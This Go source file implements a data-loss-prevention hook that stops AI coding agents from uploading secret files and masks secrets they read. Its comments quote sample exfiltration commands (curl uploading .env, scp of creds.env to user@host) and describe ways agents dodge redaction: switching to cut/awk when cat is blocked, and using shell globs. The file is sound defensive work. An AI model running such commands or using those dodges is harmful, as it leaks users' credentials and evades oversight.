// SPDX-License-Identifier: Apache-2.0

package main

// DLP, the two halves pattern scanning alone cannot cover.
//
//   - EGRESS: `curl --data-binary @.env <url>` never puts the secret in an
//     argument or a tool result, so scanning the call misses it entirely. Here
//     we read the files a transfer command would upload and scan THOSE.
//   - READ REDACTION: on Claude Code a secret in a file the agent reads is
//     masked by the PostToolUse audit hook. Antigravity runs no PostToolUse and
//     Codex refuses an output rewrite from its own, so on those clients the only
//     redaction left is to rewrite the call's ARGS before it runs: write a
//     redacted copy to a temp path and point the read at the copy.
//
// The two differ in which way they fail, and that is the point. Egress fails
// OPEN, a scan error must never break a legitimate command. Read redaction
// fails CLOSED, a secret we could not redact becomes a block, because the
// alternative is serving it unmasked.
//
// Ported from packages/hooks/guard.mjs (dlpViews, egressSecretCheck,
// dlpRedactText, dlpRedactReadPlan, dlpReadCheck). The pattern list, the
// `[REDACTED:…]` marker and the custom-glob compiler live in dlp.go and are
// reused here rather than restated; guard.mjs's dlpGlobToRe is that file's
// globToRegexp, and the two escape sets differ only in that Go's QuoteMeta
// escapes a superset of the characters, same language, same matches.

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"

	"github.com/solongate/agent-security/packages/policy"
	"github.com/solongate/agent-security/packages/shared"
)

// THE DE-OBFUSCATION EXPRESSIONS LIVE IN packages/shared/dlp.go, one copy.
//
// Two of them were declared here as well, the shell-quote stripper and the
// base64 token matcher, with the second carrying twenty lines explaining why
// its floor moved from sixteen characters to twelve. Nothing in this package
// read either one; DLPScanViews in shared does the work and owns the pair. A
// second copy of a threshold that a long comment argues for is the shape a
// drift starts in: somebody tunes the number they can see, and the number being
// enforced is the other one.
var (
	// Transfer commands. Only these pay for the extra file read, which is why
	// egress scanning stays off the common hot path.
	dlpTransferCmd = regexp.MustCompile(`\b(curl|wget|scp|rsync|sftp|ftp|nc|netcat)\b`)
	// Evidence the command actually sends OUTWARD: an http(s) URL, a
	// user@host:path target, or any bare host:path.
	dlpHTTPAnywhere   = regexp.MustCompile(`https?://`)
	dlpUserHostTarget = regexp.MustCompile(`@[\w.-]+:`)
	dlpHostPathTarget = regexp.MustCompile(`\b\S+:\S`)

	// Local files a transfer command reads in order to send them: @file,
	// -d/-T/--data* @file, `cat file`, `< file`. The alternation order in the
	// second pattern is load-bearing. Go's regexp is leftmost-FIRST like
	// JavaScript's, so `--data-binary` has to precede `--data`, which has to
	// precede `-d`, or a long flag matches as its own prefix and the filename is
	// captured one character off.
	dlpEgressFileRes = []*regexp.Regexp{
		regexp.MustCompile(`@([^\s'"|>&]+)`),
		regexp.MustCompile(`(?:-T|--upload-file|--data-binary|--data-raw|--data|-d|-F|--form)[=\s]+@?([^\s'"|>&]+)`),
		regexp.MustCompile(`\bcat\s+([^\s'"|>&]+)`),
		regexp.MustCompile(`<\s*([^\s'"|>&]+)`),
	}
	// Not a local file: stdin, a URL, or a fragment of JSON/an inline payload.
	dlpNotAFileTok = regexp.MustCompile(`^[@{[]`)

	// The transfers that name their source POSITIONALLY, with no flag in front of
	// it: `scp creds.env user@host:/tmp/x`. None of the patterns above see that
	// file, so the commonest way to copy one off a machine went unchecked.
	dlpPositionalCmd = regexp.MustCompile(`\b(scp|rsync|sftp)\b`)
	// The DESTINATION of such a command, which is not a local file to scan.
	dlpRemoteTarget = regexp.MustCompile(`^[\w.-]*@?[\w.-]+:`)

	// The reader list for read redaction is broad on purpose: agy cannot redact
	// tool OUTPUT, so any text-processing tool that can print a file's contents is
	// a redaction dodge if it is missing here, the model reached for `cut`/`awk`
	// the moment `cat` was blocked. Enumerating every reader is a losing game
	// (python -c, $(<f), while read, …); this covers the common ones and the glob
	// path below fails closed.
	dlpReaderCmd = regexp.MustCompile(`\b(cat|less|more|head|tail|bat|nl|od|xxd|hexdump|strings|grep|egrep|fgrep|rg|ag|cut|awk|gawk|sed|tr|sort|uniq|paste|join|comm|column|fold|tac|rev|pr|expand|unexpand|base64|base32|dd|mapfile|readarray)\b`)
)

// dlpHitRank moved with them. DLPScanViews cannot rank without it, and two
// implementations of "which of two hits is the one to report" is a pair that can disagree
// about what a person reads in a masked file.

// ── Egress ────────────────────────────────────────────────────────────────────

// egressSecretCheck returns a deny reason when a transfer command would upload a
// local file holding a secret, or "" to allow.
//
// Pattern DLP scans tool ARGUMENTS and tool OUTPUT, but `curl --data-binary
// @.env <url>` reads the file ITSELF, the secret never appears in either, so
// plain DLP misses it. Only runs when DLP block is configured and only for
// transfer commands, so the extra file read is off the common hot path.
func egressSecretCheck(args map[string]interface{}, sec *shared.Security, cwd string) (reason string) {
	// Fail OPEN. Never break a legitimate command on a scan error, and never let
	// one turn into a denial by way of a panic, exit status 2 IS the deny signal.
	defer func() {
		if recover() != nil {
			reason = ""
		}
	}()
	if sec == nil || sec.DLPBlock == nil {
		return ""
	}
	dlp := sec.DLPBlock
	// Resolve the files a transfer command reads relative to the AGENT's cwd, not
	// the guard process's cwd. On Antigravity the hook runs with cwd set to the
	// hooks.json directory (~/.gemini/config), so a bare join against the process
	// cwd would look in the wrong place and the egress check would silently miss.
	base := cwd
	if base == "" {
		if wd, err := os.Getwd(); err == nil {
			base = wd
		}
	}
	// PIPELINES, not commands. ExtractCommands splits on `|` too, which is right for
	// a policy rule and wrong here: `cat creds.env | curl -d @- https://…` split into a
	// half with no transfer command and a half whose only file is `-`, so a secret
	// piped into an upload was seen by neither. hooks/guard.mjs had the same bug.
	for _, c := range policy.ExtractPipelines(args) {
		lc := strings.ToLower(c)
		if !dlpTransferCmd.MatchString(lc) {
			continue
		}
		// Must actually send OUTWARD: an http(s) URL or a host:path target.
		if !dlpHTTPAnywhere.MatchString(lc) && !dlpUserHostTarget.MatchString(c) && !dlpHostPathTarget.MatchString(c) {
			continue
		}
		// A slice, not a map: the first file with a hit decides the message, so
		// randomised iteration would make the reason a coin flip between two
		// secret-bearing files in one command.
		var files []string
		seen := map[string]bool{}
		add := func(f string) {
			if f == "" || f == "-" || policy.HTTPPrefix.MatchString(f) || dlpNotAFileTok.MatchString(f) {
				return
			}
			if !seen[f] {
				seen[f] = true
				files = append(files, f)
			}
		}
		for _, re := range dlpEgressFileRes {
			for _, m := range re.FindAllStringSubmatch(c, -1) {
				add(m[1])
			}
		}
		// Positional sources. Every token that could be a path is a candidate; what
		// decides is still the content scan below, and a token that is not a file
		// fails the stat, so widening the net costs a stat and cannot cause a block.
		if dlpPositionalCmd.MatchString(lc) {
			toks := strings.Fields(c)
			if len(toks) > 1 {
				for _, tok := range toks[1:] {
					if strings.HasPrefix(tok, "-") || dlpRemoteTarget.MatchString(tok) {
						continue
					}
					add(strings.TrimPrefix(tok, "@"))
				}
			}
		}
		for _, f := range files {
			if strings.HasPrefix(f, "~") {
				home, err := os.UserHomeDir()
				if err != nil {
					continue
				}
				f = home + f[1:]
			}
			abs := f
			if !filepath.IsAbs(abs) {
				abs = filepath.Join(base, f)
			}
			// STAT BEFORE READ, and skip anything over the scan ceiling.
			//
			// The path is one the AGENT put in a transfer command, so its size is
			// the agent's choice. Reading it whole meant `curl -T big.bin` made
			// this process allocate the whole file, and dlpScanViews then builds
			// de-obfuscated views of it, so the peak is a multiple of that. The
			// guard runs before every tool call and is fail-closed, so an
			// out-of-memory kill here is a stalled agent rather than a missed scan.
			//
			// dlpMaxFileBytes is not a new rule: it is already the ceiling on
			// dlpRedactCopy in this same file. Only this spot was missing it. The
			// trade is explicit, a secret in a file over the ceiling is not caught
			// HERE, and it is the trade the other path already made.
			if st, err := os.Stat(abs); err != nil || !st.Mode().IsRegular() || st.Size() > dlpMaxFileBytes {
				continue
			}
			content, err := os.ReadFile(abs)
			if err != nil || len(content) == 0 {
				continue
			}
			if hit := shared.DLPScanViews(string(content), dlp); hit != "" {
				return `DLP: outbound transfer of "` + f + `" is blocked - it contains a ` + hit + ` (egress protection)`
			}
		}
	}
	return ""
}

// ── Redaction ─────────────────────────────────────────────────────────────────

// dlpRedactText masks every enabled secret in `text` as `[REDACTED:name]`,
// mirroring the audit hook's output redaction so Antigravity gets the SAME
// masking Claude does.
//
// THE MARKER IS NOT TEXT THE NEXT PATTERN MAY SEE, which is why this is not the
// obvious loop over ReplaceAll.
//
// Patterns run one after another over the SAME string, so by the time the
// second one runs the first has already written `[REDACTED:...]` into it. A
// pattern that then matches anything inside that marker rewrites the marker,
// and a custom pattern as ordinary as `[` turns `[REDACTED:custom]` into
// `[REDACTED:other]REDACTED:custom]`. Nothing leaks, the secret is gone either
// way, but the record of WHAT was removed is the half of redaction a person
// actually reads, and a mangled marker is a record nobody can act on.
//
// So each match becomes a placeholder no pattern can match, and the
// placeholders become markers in one final pass. The Node twin does exactly
// this with the same NUL-delimited index, and the two have to agree: the same
// file read on two clients must come back masked the same way.
func dlpRedactText(text string, cfg *shared.DLPConfig) string {
	if cfg == nil || text == "" {
		return text
	}
	enabled := make(map[string]bool, len(cfg.Patterns))
	for _, n := range cfg.Patterns {
		enabled[n] = true
	}

	// NUL is the delimiter because no DLP pattern contains one and no text an
	// agent reads has a reason to. A placeholder a pattern could match would put
	// the problem straight back.
	var labels []string
	stash := func(label string) string {
		labels = append(labels, label)
		return "\x00" + strconv.Itoa(len(labels)-1) + "\x00"
	}

	out := text
	// Built-ins then customs, each in list order: the replacement text carries the
	// pattern NAME, so the order decides what a human reads in the masked file.
	for i := 0; i < shared.DLPPatternCount(); i++ {
		name, re := shared.DLPPatternAt(i)
		if !enabled[name] {
			continue
		}
		// A function, not ReplaceAllString: a pattern name containing `$1` would
		// otherwise be expanded as a capture-group reference and the marker would
		// come out mangled, or empty, which reads as "nothing was redacted".
		out = re.ReplaceAllStringFunc(out, func(string) string {
			return stash("[REDACTED:" + name + "]")
		})
	}
	for _, c := range cfg.Custom {
		re, err := shared.GlobToRegexp(c.Re)
		if err != nil {
			continue // one bad custom pattern must not stop the rest being masked
		}
		name := c.Name
		if name == "" {
			name = "custom"
		}
		out = re.ReplaceAllStringFunc(out, func(string) string {
			return stash("[REDACTED:" + name + "]")
		})
	}

	// One pass, not a loop to a fixed point. A placeholder swallowed whole by a
	// later pattern loses its label, and a NUL-delimited number that was in the
	// ORIGINAL text resolves to nothing: both come out empty rather than as a
	// marker, and both match the Node twin, which is the behaviour that has to be
	// identical rather than the behaviour that is prettiest.
	return dlpStashRe.ReplaceAllStringFunc(out, func(m string) string {
		i, err := strconv.Atoi(strings.Trim(m, "\x00"))
		if err != nil || i < 0 || i >= len(labels) {
			return ""
		}
		return labels[i]
	})
}

// The placeholder shape, compiled once. It lives beside dlpRedactText because
// the two are one mechanism and changing either alone breaks it.
var dlpStashRe = regexp.MustCompile("\x00\\d+\x00")

// The plan dlpRedactReadPlan hands back. Block and Rewrite are exclusive: a
// non-nil plan either denies the call or replaces the named argument values.
type redactPlan struct {
	Block   bool
	Rewrite map[string]string
}

// Sentinels redactCopy returns in place of a temp path. Spelled as the Node
// hook spells them so the two functions still diff line for line; a real temp
// path is absolute and can never collide with them.
const (
	redactSkip   = "SKIP"
	redactClean  = "CLEAN"
	redactFailed = "FAILED"
)

// The largest file worth reading to decide a single tool call. Above this the
// read is left alone rather than stalling the agent on a scan.
const dlpMaxFileBytes = 1048576

// dlpRedactReadPlan implements Antigravity read redaction via `overwrite`
// (hooks.md) and the Codex equivalent via `updatedInput`: agy cannot rewrite
// tool OUTPUT, but it CAN rewrite the tool's ARGS before it runs. So when a read
// would surface a secret file, we write a REDACTED copy to a temp path and point
// the read at that copy, the agent sees `[REDACTED:…]` exactly like on Claude,
// no block needed. Works for the native read tool (swap the path arg) and shell
// reads (swap the file token in the command). FAIL-CLOSED: any uncertainty is
// `{Block: true}`, so a secret can never leak through a redaction that did not
// apply.
//
// toolName is unused, as in the original: the gating by client and by tool
// happens at the callsite, and the parameter is kept so the two signatures match.
//
// It must run LAST, after policy evaluation. A file a DENY rule blocks (a `.env`
// filename, a `secrets/` path) must never be served, not even redacted. Putting
// this before the policy, as it once was, let a redaction rewrite terminate the
// hook and silently bypass the block.
func dlpRedactReadPlan(toolName string, args map[string]interface{}, dlp *shared.DLPConfig, cwd string) (plan *redactPlan) {
	// Fail CLOSED, the opposite of every other layer here: a panic while deciding
	// whether a file is safe to serve must not be read as "it was safe".
	defer func() {
		if recover() != nil {
			plan = &redactPlan{Block: true}
		}
	}()
	if dlp == nil || args == nil {
		return nil
	}
	base := cwd
	if base == "" {
		if wd, err := os.Getwd(); err == nil {
			base = wd
		}
	}

	// Native read tool: scan EVERY string arg that looks like a path (so an
	// unfamiliar arg name cannot slip a secret file through), swap the one that is
	// a secret file for its redacted copy.
	//
	// Sorted keys, where the Node hook walks insertion order: Go map iteration is
	// randomised, and this loop RETURNS on the first hit, leaving it random would
	// make a call carrying two path-ish args rewrite a different one run to run.
	for _, k := range policy.SortedKeys(args) {
		if k == "command" {
			continue
		}
		v, ok := args[k].(string)
		if !ok || v == "" || !strings.ContainsAny(v, "./") {
			continue
		}
		r := dlpRedactCopy(dlpAbsPath(v, base), dlp)
		if r == redactSkip || r == redactClean {
			continue
		}
		if r == redactFailed {
			return &redactPlan{Block: true}
		}
		return &redactPlan{Rewrite: map[string]string{k: r}}
	}

	// Shell read command: swap each secret file token for its redacted copy.
	cmd, _ := args["command"].(string)
	if cmd == "" || !dlpReaderCmd.MatchString(strings.ToLower(cmd)) {
		return nil
	}
	newCmd, changed := cmd, false
	// reGlobTokSplit is the extractor's `[\s'"|<>;&()]+`, the same shell
	// tokenisation the glob expander uses, kept shared so a token that is a path
	// to one layer is a path to the other.
	for _, tok := range policy.GlobTokenSplit.Split(cmd, -1) {
		if tok == "" || strings.HasPrefix(tok, "-") || !strings.ContainsAny(tok, "./") {
			continue
		}
		// A glob cannot be swapped for a single redacted copy, expand it and, if
		// ANY matched file holds a secret, BLOCK the whole read (fail-closed).
		if policy.GlobChars.MatchString(tok) {
			for _, f := range dlpExpandGlob(dlpAbsPath(tok, base)) {
				if rg := dlpRedactCopy(f, dlp); rg != redactSkip && rg != redactClean {
					return &redactPlan{Block: true}
				}
			}
			continue
		}
		r := dlpRedactCopy(dlpAbsPath(tok, base), dlp)
		if r == redactSkip || r == redactClean {
			continue
		}
		if r == redactFailed {
			return &redactPlan{Block: true}
		}
		newCmd = strings.ReplaceAll(newCmd, tok, r)
		changed = true
	}
	if changed {
		return &redactPlan{Rewrite: map[string]string{"command": newCmd}}
	}
	return nil
}

// dlpRedactCopy returns one of: redactSkip (not a readable file, or too big),
// redactClean (readable, no secret), redactFailed (holds a secret but the copy
// could not be written → the caller must BLOCK, never leak), or the path of the
// redacted copy.
func dlpRedactCopy(abs string, dlp *shared.DLPConfig) string {
	if abs == "" {
		return redactSkip
	}
	st, err := os.Stat(abs)
	if err != nil || !st.Mode().IsRegular() || st.Size() > dlpMaxFileBytes {
		return redactSkip
	}
	content, err := os.ReadFile(abs)
	if err != nil {
		return redactSkip
	}
	if shared.DLPScanViews(string(content), dlp) == "" {
		return redactClean
	}
	// 0700, matching the 0600 on the copy itself and the mode of the parent. A
	// listable directory of redacted copies names, by filename, every file that
	// was found to hold a secret.
	dir := filepath.Join(shared.SGDir(), ".redacted")
	if err := os.MkdirAll(dir, shared.DirMode); err != nil {
		return redactFailed
	}
	sum := sha256.Sum256([]byte(abs))
	// Hash-prefixed so two files with the same basename in different directories
	// cannot overwrite each other's copy and serve the wrong redaction.
	name := filepath.Base(abs)
	if name == "" || name == "." || name == string(filepath.Separator) {
		name = "f"
	}
	tmp := filepath.Join(dir, hex.EncodeToString(sum[:])[:24]+"-"+name)
	// 0600: the copy is a redaction of a file that held a secret, and only the
	// agent's own user ever needs to read it back.
	if err := os.WriteFile(tmp, []byte(dlpRedactText(string(content), dlp)), 0o600); err != nil {
		return redactFailed
	}
	return tmp
}

// dlpExpandGlob resolves a shell glob token (`staging.e*`, `prod-*.txt`) to the
// real files it matches in that ONE directory.
//
// Globs are the classic redaction dodge: the filename rule cannot match
// `staging.e*` against `*.env`, and a redacted-copy swap cannot stat a path with
// a literal `*` in it, so a bare `cat staging.e*` would read the secret
// unredacted. Expanding here closes it. A non-glob path is returned unchanged so
// the caller can treat both the same way.
func dlpExpandGlob(absGlob string) []string {
	if absGlob == "" {
		return nil
	}
	// Clean BEFORE splitting and take the basename rather than slicing at the
	// directory's length: filepath.Dir cleans its result, so on an uncleaned path
	// (`/srv/./app/staging.e*`) the slice offset is wrong and yields a fragment
	// containing a `/`, which no directory entry can match, the token is silently
	// dropped and the dodge reopens. Same bug expandCommandGlobs already carries a
	// note about.
	abs := filepath.Clean(absGlob)
	dir := filepath.Dir(abs)
	b := filepath.Base(abs)
	if !policy.GlobChars.MatchString(b) {
		return []string{absGlob}
	}
	// The run of `*` collapses first, matching the JavaScript twin, where it is
	// load-bearing: this token is the AGENT's, and `[^/]*[^/]*…` backtracks
	// catastrophically there. RE2 does not, so here it only keeps the two
	// identical. See dlpGlobToRe in the hooks.
	pattern := policy.GlobStarRun.ReplaceAllString(b, "*")
	pattern = policy.GlobEscape.ReplaceAllString(pattern, `\${0}`)
	pattern = strings.ReplaceAll(pattern, "*", "[^/]*")
	pattern = strings.ReplaceAll(pattern, "?", "[^/]")
	re, err := regexp.Compile("^" + pattern + "$")
	if err != nil {
		return nil // an unbalanced bracket is not a glob we can resolve
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var out []string
	for _, e := range entries {
		if re.MatchString(e.Name()) {
			out = append(out, filepath.Join(dir, e.Name()))
		}
	}
	return out
}

// dlpAbsPath resolves a file token the way the agent's shell would: `~` against
// the home directory, everything else against the AGENT's cwd rather than the
// guard process's.
func dlpAbsPath(f, base string) string {
	x := f
	if strings.HasPrefix(x, "~") {
		home, err := os.UserHomeDir()
		if err != nil {
			return ""
		}
		x = home + x[1:]
	}
	if filepath.IsAbs(x) {
		return x
	}
	return filepath.Join(base, x)
}